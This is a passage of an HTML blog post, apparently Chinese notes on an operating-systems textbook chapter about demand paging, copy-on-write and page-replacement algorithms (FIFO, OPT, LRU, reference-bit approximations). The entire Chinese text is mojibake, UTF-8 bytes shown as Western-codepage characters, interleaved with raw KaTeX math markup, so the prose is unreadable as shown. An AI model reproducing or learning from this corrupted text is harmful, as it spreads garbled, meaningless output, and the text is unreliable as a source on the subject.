ï¼ˆä¾‹å¦‚ï¼Œä»ç©ºé—²å¸§é“¾è¡¨ä¸­é€‰å–ä¸€ä¸ªï¼‰ã€‚</li><li>â‘£è°ƒåº¦ä¸€ä¸ªç£ç›˜æ“ä½œï¼Œ ä»¥ä¾¿å°†æ‰€éœ€è¦çš„é¡µè°ƒå…¥åˆšåˆ†é…çš„å¸§ã€‚</li><li>â‘¤å½“ç£ç›˜è¯»æ“ä½œå®Œæˆåï¼Œ ä¿®æ”¹è¿›ç¨‹çš„å†…éƒ¨è¡¨å’Œé¡µè¡¨ï¼Œ ä»¥è¡¨ç¤ºè¯¥é¡µå·±åœ¨å†…å­˜ä¸­ã€‚</li><li>â‘¥é‡æ–°å¼€å§‹å› é™·é˜±è€Œä¸­æ–­çš„æŒ‡ä»¤ã€‚ è¿›ç¨‹ç°åœ¨èƒ½è®¿é—®æ‰€éœ€çš„é¡µï¼Œ å°±å¥½åƒå®ƒä¼¼ä¹æ€»åœ¨å†…å­˜ä¸­ã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220103133033220.png" alt="image-20220103133033220"></p><p><strong>æ”¯æŒæŒ‰éœ€è°ƒé¡µçš„ç¡¬ä»¶</strong>ä¸åˆ†é¡µå’Œäº¤æ¢çš„ç¡¬ä»¶ä¸€æ ·ï¼š</p><ul><li>é¡µè¡¨ï¼š è¯¥è¡¨èƒ½å¤Ÿé€šè¿‡æœ‰æ•ˆï¼æ— æ•ˆä½æˆ–ä¿æŠ¤ä½çš„ç‰¹å®šå€¼ï¼Œ å°†æ¡ç›®è®¾ä¸ºæ— æ•ˆã€‚</li><li>æ¬¡çº§å­˜å‚¨å™¨ï¼šè¯¥æ¬¡çº§å­˜å‚¨å™¨ç”¨æ¥ä¿å­˜ä¸åœ¨å†…å­˜ä¸­çš„é¡µã€‚æ¬¡çº§å­˜å‚¨å™¨é€šå¸¸ä¸ºå¿«é€Ÿç£ç›˜ã€‚å®ƒé€šå¸¸ç§°ä¸ºäº¤æ¢è®¾å¤‡ï¼Œ ç”¨äºäº¤æ¢çš„è¿™éƒ¨åˆ†ç£ç›˜ç§°ä¸ºäº¤æ¢ç©ºé—´ï¼ˆ swap spaceï¼‰ã€‚</li></ul><h3 id="922-æŒ‰éœ€è°ƒé¡µçš„æ€§èƒ½"><a class="markdownIt-Anchor" href="#922-æŒ‰éœ€è°ƒé¡µçš„æ€§èƒ½"></a> 9.2.2 æŒ‰éœ€è°ƒé¡µçš„æ€§èƒ½</h3><p><strong>æŒ‰éœ€è°ƒé¡µå†…å­˜çš„æœ‰æ•ˆè®¿é—®æ—¶é—´ï¼š</strong></p><p>è®¾pä¸ºé¡µé”™è¯¯çš„æ¦‚ç‡ï¼ˆ0â‰¤pâ‰¤1ï¼‰ã€‚ å¸Œæœ›pæ¥è¿‘äº 0ï¼Œ å³é¡µé”™è¯¯å¾ˆå°‘ã€‚</p><p>å†…å­˜è®¿é—®æ—¶é—´ï¼ˆç”¨maè¡¨ç¤ºï¼‰çš„èŒƒå›´ä¸º10ï½200ns</p><p>é‚£ä¹ˆæœ‰æ•ˆè®¿é—®æ—¶é—´ä¸ºï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">æœ‰</mi><mi mathvariant="normal">æ•ˆ</mi><mi mathvariant="normal">è®¿</mi><mi mathvariant="normal">é—®</mi><mi mathvariant="normal">æ—¶</mi><mi mathvariant="normal">é—´</mi><mi mathvariant="normal">ï¼</mi><mo stretchy="false">(</mo><mn>1</mn><mo>âˆ’</mo><mi>p</mi><mo stretchy="false">)</mo><mo>Ã—</mo><mi>m</mi><mi>a</mi><mo>+</mo><mi>p</mi><mo>Ã—</mo><mi mathvariant="normal">é¡µ</mi><mi mathvariant="normal">é”™</mi><mi mathvariant="normal">è¯¯</mi><mi mathvariant="normal">æ—¶</mi><mi mathvariant="normal">é—´</mi></mrow><annotation encoding="application/x-tex">æœ‰æ•ˆè®¿é—®æ—¶é—´ï¼ (1-p)Ã—ma+p Ã—é¡µé”™è¯¯æ—¶é—´</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">æœ‰</span><span class="mord cjk_fallback">æ•ˆ</span><span class="mord cjk_fallback">è®¿</span><span class="mord cjk_fallback">é—®</span><span class="mord cjk_fallback">æ—¶</span><span class="mord cjk_fallback">é—´</span><span class="mord cjk_fallback">ï¼</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0em;vertical-align:0em;"></span><span class="mord cjk_fallback">é¡µ</span><span class="mord cjk_fallback">é”™</span><span class="mord cjk_fallback">è¯¯</span><span class="mord cjk_fallback">æ—¶</span><span class="mord cjk_fallback">é—´</span></span></span></span></span></p><p>é¡µé”™è¯¯ä¼šå¼•èµ·å¦‚ä¸‹åºåˆ—çš„åŠ¨ä½œäº§ç”Ÿï¼š</p><ul><li>â‘ é™·å…¥åˆ°æ“ä½œç³»ç»Ÿã€‚</li><li>â‘¡ä¿å­˜ç”¨æˆ·å¯„å­˜å™¨å’Œè¿›ç¨‹çŠ¶æ€ã€‚</li><li>â‘¢ç¡®å®šä¸­æ–­æ˜¯å¦ä¸ºé¡µé”™è¯¯ã€‚</li><li>â‘£æ£€æŸ¥é¡µå¼•ç”¨æ˜¯å¦åˆæ³•å¹¶ç¡®å®šé¡µæ‰€åœ¨ç£ç›˜çš„ä½ç½®ã€‚</li><li>â‘¤ä»ç£ç›˜è¯»å…¥é¡µåˆ°ç©ºé—²å¸§ä¸­ã€‚<ul><li>a. åœ¨è¯¥ç£ç›˜é˜Ÿåˆ—ä¸­ç­‰å¾…ï¼Œ ç›´åˆ°å¤„ç†å®Œè¯»è¯·æ±‚ã€‚</li><li>b. ç­‰å¾…ç£ç›˜çš„å¯»é“å’Œ/æˆ–å»¶è¿Ÿæ—¶é—´ã€‚</li><li>c. å¼€å§‹å°†ç£ç›˜çš„é¡µä¼ åˆ°ç©ºé—²å¸§ã€‚</li></ul></li><li>â‘¥åœ¨ç­‰å¾…æ—¶ï¼Œ å°† CPU åˆ†é…ç»™å…¶ä»–ç”¨æˆ·ï¼ˆ CPU è°ƒåº¦ï¼Œ å¯é€‰ï¼‰ã€‚</li><li>â‘¦ä» I/O å­ç³»ç»Ÿæ¥æ”¶åˆ°ä¸­æ–­ï¼ˆä»¥ç¤ºI/Oå®Œæˆï¼‰ã€‚</li><li>â‘¢ä¿å­˜å…¶ä»–ç”¨æˆ·çš„å¯„å­˜å™¨å’Œè¿›ç¨‹çŠ¶æ€ï¼ˆå¦‚æœæ‰§è¡Œäº†ç¬¬ 6 æ­¥ï¼‰ã€‚</li><li>â‘¨ç¡®å®šä¸­æ–­æ˜¯å¦æ¥è‡ªç£ç›˜ã€‚</li><li>â‘©ä¿®æ­£é¡µè¡¨å’Œå…¶ä»–è¡¨ä»¥è¡¨ç¤ºæ‰€éœ€é¡µç°å·²åœ¨å†…å­˜ä¸­ã€‚</li><li>â‘ªç­‰å¾… CPU å†æ¬¡åˆ†é…ç»™æœ¬è¿›ç¨‹ã€‚</li><li>â‘«æ¢å¤ç”¨æˆ·å¯„å­˜å™¨ã€ è¿›ç¨‹çŠ¶æ€å’Œæ–°é¡µè¡¨ï¼Œ å†é‡æ–°æ‰§è¡Œä¸­æ–­çš„æŒ‡ä»¤ã€‚</li></ul><p>ä»¥ä¸Šæ­¥éª¤å¹¶ä¸æ˜¯åœ¨æ‰€æœ‰æƒ…å†µä¸‹éƒ½æ˜¯å¿…éœ€çš„ã€‚</p><p>ä¸ç®¡å¦‚ä½•ï¼Œ éƒ½æœ‰å¦‚ä¸‹ä¸‰ä¸ªä¸»è¦çš„é¡µé”™è¯¯å¤„ç†æ—¶é—´ï¼š</p><ul><li>â‘ å¤„ç†é¡µé”™è¯¯ä¸­æ–­ã€‚</li><li>â‘¡è¯»å…¥é¡µã€‚</li><li>â‘¢é‡æ–°å¯åŠ¨è¿›ç¨‹ã€‚</li></ul><p>æœ‰æ•ˆè®¿é—®æ—¶é—´ä¸é¡µé”™è¯¯ç‡ç›´æ¥æœ‰å…³ã€‚</p><p>æŒ‰éœ€è°ƒé¡µçš„ï¼›å¦ä¸€ä¸ªé‡è¦æ–¹é¢æ˜¯<strong>äº¤æ¢ç©ºé—´çš„å¤„ç†å’Œä½¿ç”¨</strong>ã€‚ç£ç›˜I/Oåˆ°äº¤æ¢ç©ºé—´é€šå¸¸æ¯”åˆ°æ–‡ä»¶ç³»ç»Ÿè¦å¿«ã€‚ è¿™æ˜¯å› ä¸ºäº¤æ¢ç©ºé—´æ˜¯æŒ‰å¤§å—æ¥åˆ†é…çš„ï¼Œå¹¶ä¸ä½¿ç”¨æ–‡ä»¶æŸ¥æ‰¾å’Œé—´æ¥åˆ†é…æ–¹æ³•ï¼ˆç¬¬ 12 ç« ã€‰ã€‚å› æ­¤ï¼Œå¦‚æœåœ¨è¿›ç¨‹å¼€å§‹æ—¶å°†æ•´ä¸ªæ–‡ä»¶é•œåƒå¤åˆ¶åˆ°äº¤æ¢ç©ºé—´ï¼Œå¹¶ä»äº¤æ¢ç©ºé—´æ‰§è¡ŒæŒ‰é¡µè°ƒåº¦ï¼Œ é‚£ä¹ˆæœ‰å¯èƒ½è·å¾—æ›´å¥½çš„è°ƒé¡µæ•ˆæœã€‚ å¦ä¸€é€‰æ‹©æ˜¯å¼€å§‹æ—¶ä»æ–‡ä»¶ç³»ç»Ÿä¸­è¿›è¡ŒæŒ‰éœ€è°ƒé¡µï¼Œ ä½†æ˜¯å½“å‡ºç°é¡µç½®æ¢æ—¶åˆ™å°†é¡µå†™å…¥äº¤æ¢ç©ºé—´ï¼Œ è¿™ç§æ–¹æ³•ç¡®ä¿åªæœ‰æ‰€éœ€çš„é¡µæ‰ä»æ–‡ä»¶ç³»ç»Ÿä¸­è°ƒå…¥ï¼Œè€Œä»¥åå‡ºç°çš„è°ƒé¡µæ˜¯ä»äº¤æ¢ç©ºé—´ä¸­è¯»å…¥çš„ã€‚</p><h2 id="93-å†™æ—¶å¤åˆ¶"><a class="markdownIt-Anchor" href="#93-å†™æ—¶å¤åˆ¶"></a> 9.3 å†™æ—¶å¤åˆ¶</h2><p>ä¼ ç»Ÿä¸Šï¼Œfork()ä¸ºå­è¿›ç¨‹åˆ›å»ºä¸€ä¸ªçˆ¶è¿›ç¨‹åœ°å€ç©ºé—´çš„å‰¯æœ¬ï¼Œ å¤åˆ¶å±äºçˆ¶è¿›ç¨‹çš„é¡µã€‚ç„¶è€Œï¼Œç”±äºè®¸å¤šå­è¿›ç¨‹åœ¨åˆ›å»ºä¹‹åé€šå¸¸é©¬ä¸Šä¼šæ‰§è¡Œç³»ç»Ÿè°ƒç”¨exec()ï¼Œæ‰€ä»¥çˆ¶è¿›ç¨‹åœ°å€ç©ºé—´çš„å¤åˆ¶å¯èƒ½æ²¡æœ‰å¿…è¦ã€‚</p><p>å› æ­¤ï¼Œ å¯ä»¥ä½¿ç”¨ä¸€ ç§ç§°ä¸º<strong>å†™æ—¶å¤åˆ¶</strong>ï¼ˆcopy-on-write ï¼‰çš„æŠ€æœ¯ã€‚ è¿™ç§æ–¹æ³•å…è®¸çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹å¼€å§‹æ—¶å…±äº«åŒä¸€é¡µé¢ã€‚ è¿™äº›é¡µé¢æ ‡è®°ä¸ºå†™æ—¶å¤åˆ¶é¡µï¼Œ å³å¦‚æœä»»ä½•ä¸€ä¸ªè¿›ç¨‹éœ€è¦å¯¹é¡µè¿›è¡Œå†™æ“ä½œï¼Œé‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ªå…±äº«é¡µçš„å‰¯æœ¬ã€‚ å†™æ—¶å¤åˆ¶å¦‚å›¾ 9.7 å’Œå›¾ 9.8 æ‰€ç¤º;è¿™ä¸¤ä¸ªå›¾åæ˜ äº†è¿›ç¨‹ lä¿®æ”¹é¡µCå‰åçš„ç‰©ç†å†…å­˜çš„æƒ…å†µã€‚</p><p><img src="/posts/8ce3e425/image-20220103135108349.png" alt="image-20220103135108349"></p><p>åªæœ‰å¯èƒ½ä¿®æ”¹çš„é¡µæ‰éœ€è¦æ ‡è®°ä¸ºå†™æ—¶å¤åˆ¶ã€‚ ä¸èƒ½ä¿®æ”¹çš„é¡µï¼ˆå³åŒ…å«å¯æ‰§è¡Œä»£ç çš„é¡µï¼‰å¯ä»¥ä¸ºçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹æ‰€å…±äº«ã€‚</p><h2 id="94-é¡µé¢ç½®æ¢"><a class="markdownIt-Anchor" href="#94-é¡µé¢ç½®æ¢"></a> 9.4 é¡µé¢ç½®æ¢</h2><p>å†…å­˜çš„è¿‡åº¦åˆ†é…ä¼šå‡ºç°ä»¥ä¸‹é—®é¢˜ã€‚å½“ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹æ‰§è¡Œæ—¶ï¼Œ ä¸€ä¸ªé¡µé”™è¯¯å‘ç”Ÿã€‚æ“ä½œç³»ç»Ÿä¼šç¡®å®šæ‰€éœ€é¡µåœ¨ç£ç›˜ä¸Šçš„ä½ç½®ï¼Œ ä½†æ˜¯å´å‘ç°ç©ºé—²å¸§åˆ—è¡¨ä¸Šå¹¶æ²¡æœ‰ç©ºé—²å¸§ï¼Œæ‰€æœ‰å†…å­˜éƒ½åœ¨ä½¿ç”¨ã€‚è¿™æ—¶å€™å°±éœ€è¦é¡µç½®æ¢ç®—æ³•ã€‚</p><h3 id="941-åŸºæœ¬é¡µç½®æ¢"><a class="markdownIt-Anchor" href="#941-åŸºæœ¬é¡µç½®æ¢"></a> 9.4.1 åŸºæœ¬é¡µç½®æ¢</h3><p><strong>ä¿®æ”¹é¡µé”™è¯¯å¤„ç†ç¨‹åº</strong>ä»¥åŒ…æ‹¬é¡µç½®æ¢ï¼š</p><ul><li>â‘ æŸ¥æ‰¾æ‰€éœ€é¡µåœ¨ç£ç›˜ä¸Šçš„ä½ç½®ã€‚</li><li>â‘¡æŸ¥æ‰¾ä¸€ä¸ªç©ºé—²å¸§ï¼š<ul><li>a. å¦‚æœæœ‰ç©ºé—²å¸§ï¼Œ é‚£ä¹ˆå°±ä½¿ç”¨å®ƒã€‚</li><li>b. å¦‚æœæ²¡æœ‰ç©ºé—²å¸§ï¼Œ é‚£ä¹ˆå°±ä½¿ç”¨é¡µç½®æ¢ç®—æ³•ä»¥é€‰æ‹©ä¸€ä¸ª â€œ ç‰ºç‰² â€ å¸§ã€ã€‚</li><li>c. å°† â€œ ç‰ºç‰² â€ å¸§çš„å†…å®¹å†™åˆ°ç£ç›˜ä¸Šï¼Œ æ”¹å˜é¡µè¡¨å’Œå¸§è¡¨ã€‚</li></ul></li><li>â‘¢å°†æ‰€éœ€é¡µè¯»å…¥(æ–°)ç©ºé—²å¸§ï¼Œ æ”¹å˜é¡µè¡¨å’Œå¸§è¡¨ã€‚</li><li>â‘£é‡å¯ç”¨æˆ·è¿›ç¨‹</li></ul><p>å¦‚æœæ²¡æœ‰å¸§ç©ºé—²ï¼Œé‚£ä¹ˆéœ€è¦é‡‡ç”¨ä¸¤ä¸ªé¡µä¼ è¾“ï¼ˆä¸€ä¸ªæ¢å‡ºï¼Œä¸€ä¸ªæ¢å…¥ï¼‰ã€‚è¿™ç§æƒ…å†µå®é™…ä¸ŠæŠŠé¡µé”™è¯¯å¤„ç†æ—¶é—´åŠ å€äº†ï¼Œ ä¸”ä¹Ÿç›¸åº”åœ°å¢åŠ äº†æœ‰æ•ˆè®¿é—®æ—¶é—´ã€‚  å¯ä»¥é€šè¿‡ä½¿ç”¨<strong>ä¿®æ”¹ä½</strong>ï¼ˆmodify bitï¼‰ æˆ–è„ä½ï¼ˆdirty bitï¼‰ä»¥é™ä½é¢å¤–å¼€é”€ã€‚æ¯é¡µæˆ–å¸§å¯ä»¥æœ‰ä¸€ä¸ªä¿®æ”¹ä½ï¼Œ é€šè¿‡ç¡¬ä»¶ä¸ä¹‹ç›¸å…³è”ã€‚æ¯å½“é¡µå†…çš„ä»»ä½•å­—æˆ–å­—èŠ‚è¢«å†™å…¥æ—¶ï¼Œ ç¡¬ä»¶å°±ä¼šè®¾ç½®è¯¥é¡µçš„ä¿®æ”¹ä½ä»¥è¡¨ç¤ºè¯¥é¡µå·±ä¿®æ”¹ã€‚ å¦‚æœä¿®æ”¹ä½å·²è®¾ç½®ï¼Œ é‚£ä¹ˆå°±å¯ä»¥çŸ¥é“è‡ªä»ç£ç›˜è¯»å…¥åè¯¥é¡µå·±å‘ç”Ÿäº†ä¿®æ”¹ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ å¦‚æœè¯¥é¡µè¢«é€‰æ‹©ä¸ºæ›¿æ¢é¡µï¼Œ å°±å¿…é¡»è¦æŠŠè¯¥é¡µå†™åˆ°ç£ç›˜ä¸Šå»ã€‚ç„¶è€Œï¼Œ å¦‚æœä¿®æ”¹ä½ æ²¡æœ‰è®¾ç½®ï¼Œ é‚£ä¹ˆä¹Ÿå°±çŸ¥é“è‡ªä»ç£ç›˜è¯»å…¥åè¯¥é¡µäº•æ²¡æœ‰å‘ç”Ÿä¿®æ”¹ã€‚ å› æ­¤ï¼Œ ç£ç›˜ä¸Šé¡µçš„å‰¯æœ¬çš„å†…å®¹æ²¡æœ‰å¿…è¦ï¼ˆä¾‹å¦‚ç”¨å…¶ä»–é¡µã€‰é‡å†™ï¼Œ å› æ­¤å°±é¿å…äº†å°†å†…å­˜é¡µå†™å›ç£ç›˜ä¸Šã€‚</p><p>ä¸ºå®ç°æŒ‰éœ€è°ƒé¡µï¼Œ å¿…é¡»è§£å†³ä¸¤ä¸ªä¸»è¦é—®é¢˜ï¼šå¿…é¡»å¼€å‘å¸§åˆ†é…ç®—æ³•å’Œé¡µç½®æ¢ç®—æ³•ã€‚å¦‚æœåœ¨å†…å­˜ä¸­æœ‰å¤šä¸ªè¿›ç¨‹ï¼Œ é‚£ä¹ˆå¿…é¡»å†³å®šä¸ºæ¯ä¸ªè¿›ç¨‹å„åˆ†é…å¤šå°‘å¸§ã€‚è€Œä¸”ï¼Œå½“éœ€è¦é¡µç½®æ¢æ—¶ï¼Œå¿…é¡»é€‰æ‹©è¦ç½®æ¢çš„å¸§ã€‚</p><h3 id="942-fifoé¡µç½®æ¢"><a class="markdownIt-Anchor" href="#942-fifoé¡µç½®æ¢"></a> 9.4.2 FIFOé¡µç½®æ¢</h3><p>æœ€ç®€å•çš„é¡µç½®æ¢ç®—æ³•æ˜¯<strong>FIFOç®—æ³•</strong>ã€‚FIFOé¡µç½®æ¢ç®—æ³•ä¸ºæ¯ä¸ªé¡µè®°å½•ç€è¯¥é¡µè°ƒå…¥å†…å­˜çš„æ—¶é—´ã€‚ å½“å¿…é¡»ç½®æ¢ä¸€é¡µæ—¶ï¼Œ å°†é€‰æ‹©æœ€æ—§çš„é¡µã€‚ æ³¨æ„å¹¶ä¸éœ€è¦è®°å½•è°ƒå…¥ä¸€é¡µçš„ç¡®åˆ‡æ—¶é—´ã€‚å¯ä»¥åˆ›å»ºä¸€ä¸ªFIFOé˜Ÿåˆ—æ¥ç®¡ç†å†…å­˜ä¸­çš„æ‰€æœ‰é¡µã€‚é˜Ÿåˆ—ä¸­çš„é¦–é¡µå°†è¢«ç½®æ¢ã€‚å½“éœ€è¦è°ƒå…¥é¡µæ—¶ï¼Œå°†å®ƒåŠ åˆ°é˜Ÿåˆ—çš„å°¾éƒ¨ã€‚</p><p><img src="/posts/8ce3e425/image-20220103142955088.png" alt="image-20220103142955088"></p><h3 id="943-æœ€ä¼˜ç½®æ¢"><a class="markdownIt-Anchor" href="#943-æœ€ä¼˜ç½®æ¢"></a> 9.4.3 æœ€ä¼˜ç½®æ¢</h3><p><strong>æœ€ä¼˜é¡µç½®æ¢ç®—æ³•</strong>æ˜¯æ‰€æœ‰ç®—æ³•ä¸­äº§ç”Ÿé¡µé”™è¯¯ç‡æœ€ä½çš„ï¼Œä¸”ç»æ²¡æœ‰Belady å¼‚å¸¸çš„é—®é¢˜ã€‚è¿™ç§ç®—æ³•ç¡®å®å­˜åœ¨ï¼Œ å®ƒè¢«ç§°ä¸º <strong>OPT æˆ– MIN</strong>ã€‚ å®ƒä¼šç½®æ¢æœ€é•¿æ—¶é—´ä¸ä¼šä½¿ç”¨çš„é¡µã€‚ ä½¿ç”¨è¿™ç§é¡µç½®æ¢ç®—æ³•ç¡®ä¿å¯¹äºç»™å®šæ•°é‡çš„å¸§ä¼šäº§ç”Ÿæœ€ä½å¯èƒ½çš„é¡µé”™è¯¯ç‡ã€‚</p><p><img src="/posts/8ce3e425/image-20220103143129400.png" alt="image-20220103143129400"></p><p>ç„¶è€Œï¼Œæœ€ä¼˜ç½®æ¢ç®—æ³•éš¾ä»¥å®ç°ï¼Œå› ä¸ºéœ€è¦å¼•ç”¨ä¸²çš„æœªæ¥çŸ¥è¯†ï¼ˆåœ¨ 5.3.2å°èŠ‚è®¨è®ºSJF CPUè°ƒåº¦æ—¶ï¼Œç¢°åˆ°è¿‡ä¸€ä¸ªç±»ä¼¼é—®é¢˜ï¼‰ã€‚</p><h3 id="944-lrué¡µç½®æ¢"><a class="markdownIt-Anchor" href="#944-lrué¡µç½®æ¢"></a> 9.4.4 LRUé¡µç½®æ¢</h3><p>å¦‚æœä½¿ç”¨ç¦»è¿‡å»æœ€è¿‘ä½œä¸ºä¸è¿œå°†æ¥çš„è¿‘ä¼¼ï¼Œ é‚£ä¹ˆå¯ç½®æ¢æœ€é•¿æ—¶é—´æ²¡æœ‰ä½¿ç”¨çš„é¡µï¼ˆè§å›¾ 9.15ï¼‰ï¼Œè¿™ç§æ–¹æ³•ç§°ä¸º<strong>æœ€è¿‘æœ€å°‘ä½¿ç”¨ç®—æ³•</strong>ï¼ˆleast-recently-used(<strong>LRU</strong>) algorithmï¼‰ã€‚</p><p><img src="/posts/8ce3e425/image-20220103143347226.png" alt="image-20220103143347226"></p><p><strong>æ ˆ</strong>ï¼šå®ç°LRUç½®æ¢çš„ ä¸€ä¸ªæ–¹æ³•æ˜¯é‡‡ç”¨é¡µç æ ˆã€‚æ¯å½“å¼•ç”¨ä¸€ä¸ªé¡µï¼Œè¯¥é¡µå°±ä»æ ˆä¸­åˆ é™¤å¹¶æ”¾åœ¨é¡¶éƒ¨ã€‚ è¿™æ ·ï¼Œ æ ˆé¡¶éƒ¨æ€»æ˜¯æœ€è¿‘ä½¿ç”¨çš„é¡µï¼Œ æ ˆåº•éƒ¨æ€»æ˜¯LRUé¡µï¼ˆå›¾9.16ï¼‰ã€‚ç”±äºå¿…é¡»ä»æ ˆä¸­éƒ¨åˆ é™¤é¡¹ï¼Œ æ‰€ä»¥è¯¥æ ˆå¯å®ç°ä¸ºå…·æœ‰å¤´æŒ‡é’ˆå’Œå°¾æŒ‡é’ˆçš„åŒå‘é“¾è¡¨ã€‚ è¿™æ ·ï¼Œ åˆ é™¤ ä¸€é¡µå¹¶æ”¾åœ¨æ ˆé¡¶éƒ¨åœ¨æœ€åæƒ…å†µä¸‹éœ€è¦æ”¹å˜6ä¸ªæŒ‡é’ˆã€‚ è™½è¯´æ¯ä¸ªæ›´æ–°æœ‰ç‚¹è´¹æ—¶ï¼Œä½†æ˜¯ç½®æ¢ä¸éœ€è¦æœç´¢ï¼›å°¾æŒ‡é’ˆæŒ‡å‘æ ˆåº•éƒ¨ï¼Œå°±æ˜¯LRUé¡µã€‚ å¯¹äºç”¨è½¯ä»¶æˆ–å¾®ä»£ç çš„LRUç½®æ¢çš„å®ç°ï¼Œ è¿™ç§æ–¹æ³•ååˆ†åˆé€‚ã€‚</p><p><img src="/posts/8ce3e425/image-20220103143738632.png" alt="image-20220103143738632"></p><h3 id="945-è¿‘ä¼¼lrué¡µç½®æ¢"><a class="markdownIt-Anchor" href="#945-è¿‘ä¼¼lrué¡µç½®æ¢"></a> 9.4.5  è¿‘ä¼¼LRUé¡µç½®æ¢</h3><p>å¾ˆå°‘æœ‰è®¡ç®—æœºç³»ç»Ÿèƒ½æä¾›è¶³å¤Ÿçš„ç¡¬ä»¶æ¥æ”¯æŒçœŸæ­£çš„LRUé¡µç½®æ¢ã€‚æœ‰çš„ç³»ç»Ÿä¸æä¾›ä»»ä½•æ”¯æŒï¼Œå› æ­¤å¿…é¡»ä½¿ç”¨å…¶ä»–ç½®æ¢ç®—æ³•ï¼ˆå¦‚FIFOç®—æ³•ï¼‰ã€‚</p><p>ç„¶è€Œï¼Œ è®¸å¤šç³»ç»Ÿéƒ½é€šè¿‡<strong>å¼•ç”¨ä½</strong>æ–¹å¼æä¾›ä¸€å®šçš„æ”¯æŒã€‚é¡µè¡¨å†…çš„æ¯é¡¹éƒ½å…³è”ç€ä¸€ä¸ªå¼•ç”¨ä½ï¼ˆreference bitï¼‰ã€‚æ¯å½“å¼•ç”¨ä¸€ä¸ªé¡µæ—¶ï¼ˆæ— è®ºæ˜¯å¯¹é¡µçš„å­—èŠ‚è¿›è¡Œè¯»æˆ–å†™ï¼‰ï¼Œ ç›¸åº”é¡µè¡¨çš„å¼•ç”¨ä½å°±è¢«ç¡¬ä»¶ç½®ä½ã€‚å¼€å§‹ï¼Œ æ“ä½œç³»ç»Ÿä¼šå°†æ‰€æœ‰å¼•ç”¨ä½éƒ½æ¸…é›¶ã€‚ éšç€ç”¨æˆ·è¿›ç¨‹çš„æ‰§è¡Œï¼Œ ä¸å¼•ç”¨é¡µç›¸å…³è”çš„å¼•ç”¨ä½è¢«ç¡¬ä»¶ç½® ä½ï¼ˆç½®ä¸º 1ï¼‰ã€‚ä¹‹åï¼Œé€šè¿‡æ£€æŸ¥å¼•ç”¨ä½ï¼Œèƒ½å¤Ÿç¡®å®šå“ªäº›é¡µ ä½¿ç”¨è¿‡è€Œå“ªäº›é¡µæœªä½¿ç”¨è¿‡ã€‚è™½ç„¶ä¸çŸ¥é“ ä½¿ç”¨é¡ºåºï¼Œä½†æ˜¯çŸ¥é“å“ªäº›é¡µ ç”¨è¿‡è€Œå“ªäº›é¡µæœªç”¨è¿‡ã€‚è¿™ä¿¡æ¯æ˜¯è®¸å¤šè¿‘ä¼¼LRUé¡µç½®æ¢ç®—æ³•çš„åŸºç¡€ã€‚</p><ol><li><p><strong>é™„åŠ å¼•ç”¨ä½ç®—æ³•</strong><br>é€šè¿‡åœ¨è§„å®šæ—¶é—´é—´éš”é‡Œè®°å½•å¼•ç”¨ä½ï¼Œå¯ä»¥è·å¾—é¢å¤–é¡ºåºä¿¡æ¯ã€‚ å¯ä»¥ä¸ºä½äºå†…å­˜å†…çš„æ¯ä¸ªè¡¨ä¸­çš„é¡µä¿ç•™ä¸€ä¸ª8ä½çš„å­—èŠ‚ã€‚åœ¨è§„å®šæ—¶é—´é—´éš”ï¼ˆå¦‚ï¼Œ æ¯100 msï¼‰ å†…ï¼Œæ—¶é’Ÿå®šæ—¶å™¨äº§ç”Ÿä¸­æ–­å¹¶å°†æ§åˆ¶è½¬äº¤ç»™æ“ä½œç³»ç»Ÿã€‚ æ“ä½œç³»ç»ŸæŠŠæ¯ä¸ªé¡µçš„å¼•ç”¨ä½è½¬ç§»åˆ°å…¶8ä½å­—èŠ‚çš„é«˜ä½ï¼Œè€Œå°† å…¶ä»–ä½å‘å³ç§»ä¸€ä½ï¼Œå¹¶æŠ›å¼ƒæœ€ä½ä½ã€‚ è¿™äº›8ä½ç§»ä½å¯„å­˜å™¨åŒ…å«ç€è¯¥é¡µåœ¨æœ€è¿‘8ä¸ªæ—¶é—´å‘¨æœŸå†…çš„ä½¿ç”¨æƒ…å†µã€‚ ä¾‹å¦‚ï¼Œå¦‚æœç§»ä½å¯„å­˜å™¨å«æœ‰00000000ï¼Œé‚£ä¹ˆè¯¥é¡µåœ¨8ä¸ªæ—¶é—´å‘¨æœŸå†…æ²¡æœ‰ä½¿ç”¨ï¼šå¦‚æœç§»ä½å¯„å­˜å™¨çš„å€¼ä¸º11111111ï¼Œ é‚£ä¹ˆè¯¥é¡µåœ¨è¿‡å»æ¯ä¸ªå‘¨æœŸå†…éƒ½è‡³å°‘ä½¿ç”¨è¿‡ ä¸€æ¬¡ã€‚å…·æœ‰å€¼ä¸º11000100 çš„ç§»ä½å¯„å­˜å™¨çš„é¡µè¦æ¯”å€¼ä¸º01110111 çš„é¡µæ›´ä¸ºæœ€è¿‘ä½¿ç”¨ã€‚ å¦‚æœå°†è¿™8ä½å­—èŠ‚ä½œä¸ºæ— 